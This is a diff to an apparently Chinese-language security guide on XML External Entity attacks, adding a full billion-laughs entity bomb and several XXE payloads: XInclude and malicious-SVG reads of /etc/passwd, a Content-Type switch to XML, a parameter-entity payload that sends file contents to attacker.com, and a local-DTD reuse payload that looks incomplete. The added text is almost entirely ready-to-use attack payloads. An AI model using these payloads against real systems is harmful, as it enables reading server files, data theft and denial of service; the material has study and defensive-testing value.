@@ -120,10 +120,64 @@ $doc->loadXML($userInput);  // 未禁用实体解析
   <!ENTITY b "&a;&a;">
   <!ENTITY c "&b;&b;">
   <!ENTITY d "&c;&c;">
-  ...
+  <!ENTITY e "&d;&d;">
+  <!ENTITY f "&e;&e;">
+  <!ENTITY g "&f;&f;">
+  <!ENTITY h "&g;&g;">
+  <!ENTITY i "&h;&h;">
+  <!ENTITY j "&i;&i;">
   <!ENTITY k "&j;&j;">
 ]>
 <bomb>&k;</bomb>
+```
+
+#### XInclude 攻击（无法控制 DOCTYPE 时）
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+#### 隐藏攻击面利用
+
+```xml
+<!-- 文件上传场景：恶意 SVG 文件 -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <!DOCTYPE svg [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <text>&xxe;</text>
+</svg>
+
+<!-- Content-Type 绕过：将表单数据改为 XML -->
+Content-Type: text/xml
+
+POST body:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+```
+
+#### XXE 错误消息数据提取
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+  %exfiltrate;
+]>
+```
+
+#### 本地 DTD 复用盲注
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
+  <!ENTITY % payload SYSTEM "file:///etc/passwd">
+  %local_dtd;
+]>
 ```
 
 ---
